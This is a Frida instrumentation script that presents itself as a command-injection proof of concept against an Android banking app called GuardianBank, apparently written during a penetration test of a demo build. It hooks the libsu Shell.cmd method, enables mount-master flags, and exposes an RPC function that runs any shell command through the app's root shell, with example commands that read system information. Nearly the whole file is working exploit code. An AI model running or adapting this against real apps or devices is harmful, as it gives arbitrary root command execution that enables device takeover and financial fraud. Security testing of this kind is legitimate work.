/**
 * Command-injection PoC — gokul1630/root ExecuteCommand → Shell.cmd(String[])
 * libsu 5.x has no Shell.cmd(String) — only String[] / InputStream
 *
 *   frida -U -f com.demo.guardianbank -l PPS_UAT/GuardianBank/guardianbank_cmd_injection.js
 *
 * REPL:
 *   rpc.exports.runCmd("id")
 *   rpc.exports.runCmd("cat /proc/version")
 */
"use strict";

Java.perform(function () {
    var Shell = Java.use("com.topjohnwu.superuser.Shell");

    try {
        Shell.setDefaultBuilder(
            Shell.Builder.create().setFlags(Shell.FLAG_MOUNT_MASTER)
        );
    } catch (e) { /* ok */ }

    var origCmd = Shell.cmd.overload("[Ljava.lang.String;");
    Shell.cmd.overload("[Ljava.lang.String;").implementation = function (argv) {
        var parts = [];
        for (var i = 0; i < argv.length; i++) {
            parts.push(String(argv[i]));
        }
        console.log("[CMD-INJ] Shell.cmd(" + parts.join(" | ") + ")");
        return origCmd.call(this, argv);
    };
    console.log("[+] Shell.cmd(String[]) hooked");

    function toArgv(cmd) {
        return Java.array("java.lang.String", ["sh", "-c", String(cmd)]);
    }

    function run(cmd) {
        var r = Shell.cmd(toArgv(cmd)).exec();
        var out = r.getOut();
        var text = "";
        for (var i = 0; i < out.size(); i++) {
            text += out.get(i) + "\n";
        }
        text += "exit=" + r.getCode();
        console.log("[CMD-INJ] output:\n" + text);
        return text;
    }

    rpc.exports = {
        runCmd: function (cmd) {
            var result = "";
            Java.perform(function () {
                result = run(cmd);
            });
            return result;
        }
    };

    console.log("[CMD-INJ] Ready — rpc.exports.runCmd('id')");
});
